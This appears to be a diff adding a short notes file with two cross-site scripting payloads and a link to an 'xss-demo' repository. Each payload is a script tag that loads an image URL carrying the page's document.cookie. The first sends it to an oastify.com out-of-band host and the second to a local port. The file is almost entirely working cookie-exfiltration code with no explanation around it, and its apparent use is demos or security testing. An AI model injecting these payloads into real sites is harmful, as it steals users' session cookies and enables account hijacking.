@@ -1,0 +1,8 @@
+<script>new Image().src="http://bkzfz2rf3jbbp80ci1806dt9k0qrek29.oastify.com/abc.php?output="+document.cookie;</script> 
+
+
+
+<script>new Image().src="http://0.0.0.0:9090/abc.php?output="+document.cookie;</script> 
+
+
+https://github.com/bgres/xss-demo/tree/master
